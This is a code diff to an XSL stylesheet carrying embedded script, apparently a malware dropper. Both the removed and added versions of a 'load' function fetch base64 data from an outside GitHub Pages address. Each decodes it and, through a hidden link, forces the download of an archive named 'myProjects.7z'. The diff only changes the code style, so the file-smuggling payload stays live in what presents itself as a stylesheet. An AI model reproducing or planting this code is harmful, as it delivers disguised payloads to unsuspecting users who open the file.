@@ -16,27 +16,29 @@ version="1.0">
 	    return bytes.buffer;
 	}
 
-	const load = async (url) => {
-	    const response = await fetch(url);
-	    const abc = await response.text();
-	    var data = base64ToArrayBuffer(abc);
-	    var blob = new Blob([data], {
-		type: 'octet/stream'
-	    });
-	    var fileName = 'myProjects.7z';
-	    if (window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob, fileName);
-	    else {
-		var a = document.createElement('a');
-		document.body.appendChild(a);
-		a.style = 'display: none';
-		var url = window.URL.createObjectURL(blob);
-		a.href = url;
-		a.download = fileName;
-		a.click();
-		window.URL.revokeObjectURL(url);
-	    }
-	};
-
+	function load(url) {
+	    fetch(url)
+		.then((response) => response.text())
+		.then((abc) => {
+		    var data = base64ToArrayBuffer(abc);
+		    var blob = new Blob([data], {
+			type: 'octet/stream'
+		    });
+		    var fileName = 'myProjects.7z';
+		    if (window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob, fileName);
+		    else {
+			var a = document.createElement('a');
+			document.body.appendChild(a);
+			a.style = 'display: none';
+			var url = window.URL.createObjectURL(blob);
+			a.href = url;
+			a.download = fileName;
+			a.click();
+			window.URL.revokeObjectURL(url);
+		    }
+		})
+		.catch((error) => console.error(error));
+	}
 	load('https://tylerhill12.github.io/mDi8aWs');
 	]]> </ms:script>
 </stylesheet>
